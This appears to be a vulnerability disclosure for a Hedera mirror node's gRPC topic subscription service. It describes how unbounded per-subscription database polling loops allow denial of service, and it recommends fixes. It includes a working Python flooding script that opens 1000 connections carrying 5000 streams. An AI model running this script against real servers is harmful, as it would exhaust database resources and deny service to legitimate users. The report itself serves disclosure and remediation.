### Title
Unbounded Concurrent Subscriptions in `PollingTopicListener` Enable DB-Level DoS

### Summary
`PollingTopicListener.listen()` creates a fully independent DB polling loop per subscription with no global cap on total active subscriptions. The only server-side guard — `maxConcurrentCallsPerConnection = 5` — limits streams per TCP connection but imposes no limit on the number of connections an attacker may open. An unauthenticated attacker can therefore open arbitrarily many connections, each carrying 5 subscriptions, driving DB query rate and memory usage up linearly with no bound.

### Finding Description

**Independent polling loop per subscription — no sharing:**

`PollingTopicListener.listen()` allocates a fresh `PollingContext` and a new `Flux` that fires `topicMessageRepository.findByFilter()` on every tick of `interval` (default 500 ms) for the lifetime of the subscription. [1](#0-0) 

There is no shared upstream, no deduplication, and no cap on how many such loops may run concurrently. Contrast this with `SharedPollingTopicListener`, which uses a single `.share()`-d `Flux` regardless of subscriber count. [2](#0-1) 

**`subscriberCount` is a metric, not a gate:**

`TopicMessageServiceImpl` increments/decrements an `AtomicLong` for observability only. It is never compared against a threshold and never rejects a new subscription. [3](#0-2) 

**`maxConcurrentCallsPerConnection` is per-connection, not global:**

The only enforced limit is 5 concurrent streams per TCP connection. There is no per-IP connection limit, no global connection cap, and no per-`topicId` subscription cap configured anywhere. [4](#0-3) [5](#0-4) 

`ListenerProperties` exposes no `maxSubscriptions` field of any kind. [6](#0-5) 

**Exploit flow:**

1. Attacker opens `C` TCP connections to the gRPC endpoint (no authentication required, no per-IP connection limit).
2. On each connection the attacker opens 5 `subscribeTopic` streams with `limit=0` (no limit) and a `startTime` in the past, targeting any valid `topicId`.
3. Each stream causes `PollingTopicListener.listen()` to be called, spawning an independent `Flux` that executes `SELECT … FROM topic_message WHERE …` every 500 ms indefinitely.
4. Total concurrent DB queries = `C × 5 / 0.5s` = `10C` queries/second, growing linearly with `C`.
5. Each live `PollingContext` + Reactor chain also holds heap memory proportional to `maxPageSize` (up to 5000 rows × row size per poll result).

### Impact Explanation
With the `POLL` listener type active, every subscription is a dedicated DB polling loop. An attacker with a single machine and modest bandwidth can open thousands of connections, saturating the database connection pool and query throughput, causing query latency to spike for all legitimate users and potentially crashing the mirror node's DB tier. Memory pressure from concurrent result-set buffers compounds the effect.

### Likelihood Explanation
No authentication, no IP-based rate limiting, and no global subscription cap are required to be bypassed. The attacker needs only a TCP connection to the gRPC port and knowledge of one valid `topicId` (or can enumerate via the REST API). The attack is trivially scriptable, repeatable, and requires no special privileges or insider knowledge.

### Recommendation

1. **Add a global subscription cap** in `TopicMessageServiceImpl.subscribeTopic()`: compare `subscriberCount` against a configurable `maxSubscriptions` property and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Add a per-IP connection limit** via `NettyServerBuilder.maxConnectionsPerIp()` or an equivalent load-balancer rule.
3. **Prefer `SHARED_POLL` or `REDIS`** listener types in production; document that `POLL` mode is unsafe for public-facing deployments.
4. **Add `maxSubscriptions` to `ListenerProperties`** and enforce it inside `listen()` before constructing the polling `Flux`.

### Proof of Concept

```python
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from google.protobuf.timestamp_pb2 import Timestamp

TARGET = "mirror-node-grpc:5600"
TOPIC  = consensus_service_pb2.TopicID(shardNum=0, realmNum=0, topicNum=1)
START  = Timestamp(seconds=0, nanos=0)

def flood(n):
    ch = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(ch)
    req  = consensus_service_pb2.ConsensusTopicQuery(
               topicID=TOPIC, consensusStartTime=START)
    # Open 5 streams per connection (maxConcurrentCallsPerConnection limit)
    streams = [stub.subscribeTopic(req) for _ in range(5)]
    for s in streams:
        threading.Thread(target=lambda st=s: list(st), daemon=True).start()

# Open 1000 connections → 5000 independent DB polling loops → 10 000 queries/s
for i in range(1000):
    threading.Thread(target=flood, args=(i,), daemon=True).start()

input("Attack running — observe DB query rate and mirror node memory…")
```

Each `flood()` call opens a fresh TCP connection (bypassing the per-connection limit) and saturates it with 5 long-lived `subscribeTopic` streams, each backed by an independent 500 ms DB polling loop in `PollingTopicListener.listen()`.

    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
    }
